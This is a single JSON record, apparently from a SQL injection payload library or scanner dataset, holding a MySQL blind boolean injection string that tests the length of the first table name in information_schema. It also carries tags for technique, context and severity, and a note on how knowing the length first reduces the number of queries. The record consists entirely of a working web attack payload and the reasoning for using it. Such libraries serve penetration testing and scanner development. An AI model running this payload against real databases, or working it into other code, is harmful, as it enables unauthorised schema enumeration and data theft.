{"text": "' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)>5 --", "technique": "blind_boolean", "databases": ["mysql"], "contexts": ["string"], "waf_bypasses": ["none"], "severity_boost": 0.88, "explanation": "Table name length extraction. Knowing the length before extracting characters reduces the total number of queries needed."}
